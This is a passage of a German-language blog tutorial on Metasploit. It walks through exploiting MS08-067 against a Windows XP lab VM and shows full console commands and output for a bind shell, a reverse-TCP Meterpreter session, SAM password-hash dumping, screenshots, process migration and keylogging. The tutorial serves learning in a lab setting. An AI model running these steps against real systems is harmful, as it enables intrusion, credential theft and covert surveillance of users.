+<p>10.) Nach auswahl des Payload prüfen wir mit <strong>show options</strong> ob der ausgewählte Payload noch zusätzliche Einstellungen benötigt. Die benötigten Optionen sind mit <strong>Required yes</strong> markiert und sollte ein Payload einmal fehlschlagen empfiehlt es sich noch einmal alle Optionen zu prüfen.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show options
+Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:
+
+   Name     Current Setting  Required  Description
+   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOST    192.168.1.110    <span class="nb">yes       </span>The target address
+   RPORT    445              <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBPIPE  BROWSER          <span class="nb">yes       </span>The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>
+
+
+Payload options <span class="o">(</span>windows/shell/bind_tcp<span class="o">)</span>:
+
+   Name      Current Setting  Required  Description
+   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
+   LPORT     4444             <span class="nb">yes       </span>The listen port
+   RHOST     192.168.1.110    no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Automatic Targeting
+
+</code></pre></div></div>
+
+<h3 id="exploit">exploit</h3>
+<p>10.) Nun ist unser exploit richtig konfiguriert und kann mit dem Befehl <strong>exploit</strong> gestartet werden.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> exploit
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started <span class="nb">bind </span>handler
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Automatically detecting the target...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - We could not detect the language pack, defaulting to English
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Selected Target: Windows XP SP3 English <span class="o">(</span>AlwaysOn NX<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Attempting to trigger the vulnerability...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encoded stage with x86/shikata_ga_nai
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending encoded stage <span class="o">(</span>267 bytes<span class="o">)</span> to 192.168.1.110
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.1.243:35797 -&gt; 192.168.1.110:4444<span class="o">)</span> at 2018-01-31 22:05:37 +0100
+
+Microsoft Windows XP <span class="o">[</span>Version 5.1.2600]
+<span class="o">(</span>C<span class="o">)</span> Copyright 1985-2001 Microsoft Corp.
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
+
+</code></pre></div></div>
+
+<h3 id="auf-dem-zielsystem">Auf dem Zielsystem</h3>
+<p>11.) War der Exploit erfolgreich erhalten wir eine Windows Command prompt. Der Beweis das wir uns wirklich auf dem Zielsystem befinden ist ganz unten die IP Adresse 192.168.1.110 !</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;systeminfo
+systeminfo
+
+Host Name:                 IE6WINXP
+OS Name:                   Microsoft Windows XP Professional
+OS Version:                5.1.2600 Service Pack 3 Build 2600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          IEUser
+Registered Organization:   
+Product ID:                76487-024-5236883-22915
+Original Install Date:     10/12/2012, 1:45:14 PM
+System Up Time:            21350397 Days, 20 Hours, 44 Minutes, 4 Seconds
+System Manufacturer:       innotek GmbH
+System Model:              VirtualBox
+System <span class="nb">type</span>:               X86-based PC
+Processor<span class="o">(</span>s<span class="o">)</span>:              1 Processor<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: x86 Family 21 Model 1 Stepping 2 AuthenticAMD ~3896 Mhz
+BIOS Version:              VBOX   - 1
+Windows Directory:         C:<span class="se">\W</span>INDOWS
+System Directory:          C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32
+Boot Device:               <span class="se">\D</span>evice<span class="se">\H</span>arddiskVolume1
+System Locale:             en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
+Input Locale:              en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
+Time Zone:                 <span class="o">(</span>GMT-08:00<span class="o">)</span> Pacific Time <span class="o">(</span>US &amp; Canada<span class="o">)</span><span class="p">;</span> Tijuana
+Total Physical Memory:     511 MB
+Available Physical Memory: 388 MB
+Virtual Memory: Max Size:  2,048 MB
+Virtual Memory: Available: 2,008 MB
+Virtual Memory: In Use:    40 MB
+Page File Location<span class="o">(</span>s<span class="o">)</span>:     C:<span class="se">\p</span>agefile.sys
+Domain:                    MSHOME
+Logon Server:              N/A
+Hotfix<span class="o">(</span>s<span class="o">)</span>:                 16 Hotfix<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: File 1
+                           <span class="o">[</span>02]: File 1
+                           <span class="o">[</span>03]: File 1
+                           <span class="o">[</span>04]: File 1
+                           <span class="o">[</span>05]: File 1
+                           <span class="o">[</span>06]: File 1
+                           <span class="o">[</span>07]: Q147222
+                           <span class="o">[</span>08]: KB952069_WM9
+                           <span class="o">[</span>09]: KB954155_WM9
+                           <span class="o">[</span>10]: KB973540_WM9
+                           <span class="o">[</span>11]: KB2749655 - Update
+                           <span class="o">[</span>12]: KB952287 - Update
+                           <span class="o">[</span>13]: KB955759 - Update
+                           <span class="o">[</span>14]: KB968389 - Update
+                           <span class="o">[</span>15]: KB971029 - Update
+                           <span class="o">[</span>16]: KB973815 - Update
+NetWork Card<span class="o">(</span>s<span class="o">)</span>:           1 NIC<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: AMD PCNET Family PCI Ethernet Adapter
+                                 Connection Name: Local Area Connection 5
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     192.168.1.1
+                                 IP address<span class="o">(</span>es<span class="o">)</span>
+                                 <span class="o">[</span>01]: 192.168.1.110
+
+</code></pre></div></div>
+
+<h2 id="meterpreter">Meterpreter</h2>
+
+<h3 id="set-payload-meterpreter">set payload meterpreter</h3>
+<p>1.) Wir entscheiden uns hier für den <strong>windows/meterpreter/reverse_tcp</strong> payload.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
+payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
+</code></pre></div></div>
+
+<h3 id="show-options-1">show options</h3>
+<p>2.) Mittels <strong>show options</strong> prüfen wir welche Parameter der neue Payload benötigt. Wie leicht zu erkennen ist benötigt der neue Payload die IP Adresse des Computer von den wir Meterpreter gestartet haben um eine Verbindung aufzubauen.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:
+
+   Name     Current Setting  Required  Description
+   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOST    192.168.1.110    <span class="nb">yes       </span>The target address
+   RPORT    445              <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBPIPE  BROWSER          <span class="nb">yes       </span>The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>
+
+
+Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name      Current Setting  Required  Description
+   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
+   LHOST                      <span class="nb">yes       </span>The listen address
+   LPORT     4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Automatic Targeting
+
+</code></pre></div></div>
+<h3 id="set-lhost">set LHOST</h3>
+<p>3.) Mittels <strong>set LHOST</strong> setzen wir die IP Adresse auf 192.168.1.243</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 192.168.1.243
+LHOST <span class="o">=&gt;</span> 192.168.1.243
+</code></pre></div></div>
+
+<p>4.) Bevor wir den neuen Exploit starten überpürfen wir noch einmal ob alle einstellungen korrekt gesetzt sind</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show options
+Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:
+
+   Name     Current Setting  Required  Description
+   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOST    192.168.1.110    <span class="nb">yes       </span>The target address
+   RPORT    445              <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBPIPE  BROWSER          <span class="nb">yes       </span>The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>
+
+
+Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name      Current Setting  Required  Description
+   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
+   LHOST     192.168.1.243    <span class="nb">yes       </span>The listen address
+   LPORT     4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Automatic Targeting
+
+</code></pre></div></div>
+
+<h3 id="exploit-meterpreter">exploit meterpreter</h3>
+<p>5.) Mit <strong>exploit</strong> starten wir den meterpreter payload.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> exploit
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 192.168.1.243:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Automatically detecting the target...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Selected Target: Windows XP SP3 English <span class="o">(</span>AlwaysOn NX<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Attempting to trigger the vulnerability...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>179779 bytes<span class="o">)</span> to 192.168.1.110
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 5 opened <span class="o">(</span>192.168.1.243:4444 -&gt; 192.168.1.110:1032<span class="o">)</span> at 2018-01-31 22:30:17 +0100
+
+</code></pre></div></div>
+<p>War der Exploit erfolgreich können wir nun einige vorgefertigte Skripts und Befehle verwenden.</p>
+
+<h3 id="hashdump">hashdump</h3>
+<p>Auslesen des Windows SAM(Security Account Manager) Datenbank</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> run post/windows/gather/hashdump
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Obtaining the boot key...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Calculating the hboot key using SYSKEY 422105af62b50d0000d267d8145cf830...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Obtaining the user list and keys...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Decrypting user keys...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping password hints...
+
+No <span class="nb">users </span>with password hints on this system
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping password hashes...
+
+
+Administrator:500:b34ce522c3e4c87722c34254e51bff62:fc525c9683e8fe067095ba2ddc971889:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:9b45eefa50cbd1f779518231c8ae0fb3:8da1ecee0f0c121facdfb869612a33c6:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:60a8616c6fd013a1aff2d7c3328b4af8:::
+IEUser:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</code></pre></div></div>
+
+<h3 id="ps">ps</h3>
+<p>Aktuell laufende Prozesse auslesen</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> ps
+
+Process List
+<span class="o">============</span>
+
+ PID   PPID  Name              Arch  Session  User                          Path
+ <span class="nt">---</span>   <span class="nt">----</span>  <span class="nt">----</span>              <span class="nt">----</span>  <span class="nt">-------</span>  <span class="nt">----</span>                          <span class="nt">----</span>
+ 0     0     <span class="o">[</span>System Process]                                               
+ 4     0     System            x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           
+ 364   4     smss.exe          x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           <span class="se">\S</span>ystemRoot<span class="se">\S</span>ystem32<span class="se">\s</span>mss.exe
+ 484   604   logon.scr         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\l</span>ogon.scr
+ 580   364   csrss.exe         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           <span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\c</span>srss.exe
+ 604   364   winlogon.exe      x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           <span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\w</span>inlogon.exe
+ 648   604   services.exe      x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>ervices.exe
+ 660   604   lsass.exe         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\l</span>sass.exe
+ 820   648   VBoxService.exe   x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\V</span>BoxService.exe
+ 872   648   svchost.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
+ 900   648   alg.exe           x86   0        NT AUTHORITY<span class="se">\L</span>OCAL SERVICE    C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\a</span>lg.exe
+ 940   648   svchost.exe       x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
+ 1032  648   svchost.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\s</span>vchost.exe
+ 1084  648   svchost.exe       x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
+ 1120  648   svchost.exe       x86   0        NT AUTHORITY<span class="se">\L</span>OCAL SERVICE    C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
+ 1164  604   logonui.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\l</span>ogonui.exe
+ 1516  1636  ntvdm.exe         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\n</span>tvdm.exe
+ 1948  648   spoolsv.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>poolsv.exe
+
+</code></pre></div></div>
+
+<h3 id="screenshot">screenshot</h3>
+<p>Erstellen eines Screenshots vom Bildschirm des Zielsystems</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> screenshot
+Screenshot saved to: /root/ZxRxRrPE.jpeg
+</code></pre></div></div>
+<p><img src="/images/posts/metasploit/windows_XP.jpeg" alt="image-center" class="align-center" /></p>
+
+<h3 id="keyscan">keyscan</h3>
+<p>Startet die Protokollierung von Tastenbetätigungen auf dem Zielcomputer.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> ps
+
+Process list
+<span class="o">=================</span>
+
+PID Name         Path
+<span class="nt">---</span> <span class="nt">----</span>         <span class="nt">----</span>
+401 winlogon.exe C:<span class="se">\W</span>INNT<span class="se">\s</span>ystem32<span class="se">\w</span>inlogon.exe
+
+meterpreter <span class="o">&gt;</span> migrate 401
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migrating to 401...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migration completed successfully.
+
+meterpreter <span class="o">&gt;</span> keyscan_start
+Starting the keystroke sniffer...
+
+<span class="k">****</span> A few minutes later after an admin logs <span class="k">in</span> <span class="k">****</span>
+
+meterpreter <span class="o">&gt;</span> keyscan_dump
+Dumping captured keystrokes...
+Administrator ohnoes1vebeenh4x0red!
+
+</code></pre></div></div>
+
+<h2 id="mehr-informationen">Mehr Informationen</h2>
+
+<p>Eine Sammlung der Wichtigsten Metasploit Befehlen<br />
+<a href="/docs/metasploit_50">Metasploit Kommandoreferenz</a></p>
+
+<p>Offensive security Tutorial<br />
+<a href="https://www.offensive-security.com/metasploit-unleashed/">https://www.offensive-security.com/metasploit-unleashed/</a></p>
+
+<p>Offiziele Dokumentation Rapid7
+<a href="https://metasploit.help.rapid7.com/docs">https://metasploit.help.rapid7.com/docs</a></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">See you !</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Aktualisiert:</strong> <time datetime="2018-01-04T00:00:00+01:00">January 04, 2018</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Teilen auf</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=60dmg&text=Metasploit%20https%3A%2F%2Fdg60.github.io%2FMetasploit%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Teilen auf Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdg60.github.io%2FMetasploit%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Teilen auf Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=https%3A%2F%2Fdg60.github.io%2FMetasploit%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Teilen auf Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fdg60.github.io%2FMetasploit%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Teilen auf LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="https://dg60.github.io/NMAP/" class="pagination--pager" title="Nmap
+">Vorherige</a>
+    
+    
+      <a href="https://dg60.github.io/Code-Generator-BETA-Release/" class="pagination--pager" title="Code Generator Beta Release
+">Nächste</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">Ihnen gefällt vielleicht auch</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "https://dg60.github.io/images/works/CodeGenerator/CodeGen_BuR.png"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="https://dg60.github.io/Code-Generator-BETA-Release/" rel="permalink">Code Generator Beta Release
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  weniger als 1 Minuten zum lesen
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Codegenerator
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "https://dg60.github.io/images/docs/nmap.png"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="https://dg60.github.io/NMAP/" rel="permalink">Nmap
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  12 Minuten zum lesen
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Eine kurze Einführung in den Netzwerk/Portscanner Nmap
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "https://dg60.github.io/images/docs/pm2_small.png"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="https://dg60.github.io/PM2-Prozess-Manager-Einf%C3%BChrung/" rel="permalink">Pm2 Prozess Manager Einführung
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  8 Minuten zum lesen
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Eine kurze Einführung in den Prozess-Manger PM2
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "https://dg60.github.io/images/docs/node-red-icon.png"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="https://dg60.github.io/Node-Red-Einf%C3%BChrung/" rel="permalink">Node Red Einführung
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  4 Minuten zum lesen
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Eine kurze Einführung in Node-RED
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Folgen:</strong></li>
+    
+    
+      <li><a href="https://twitter.com/60dmg"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+    
+    
+      <li><a href="https://www.facebook.com/danielmichael.grill"><i class="fab fa-fw fa-facebook-square" aria-hidden="true"></i> Facebook</a></li>
+    
+    
+      <li><a href="https://github.com/dg60"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    
+    
+    
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 Daniel Grill. Möglich durch <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="https://dg60.github.io/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+
+
+<script src="https://dg60.github.io/assets/js/lunr/lunr.min.js"></script>
+<script src="https://dg60.github.io/assets/js/lunr/lunr-store.js"></script>
+<script src="https://dg60.github.io/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  </body>
+</html>
